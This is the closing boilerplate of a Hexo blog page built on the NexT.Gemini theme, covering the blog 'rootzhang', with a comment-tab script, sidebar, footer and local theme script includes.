  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">42</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
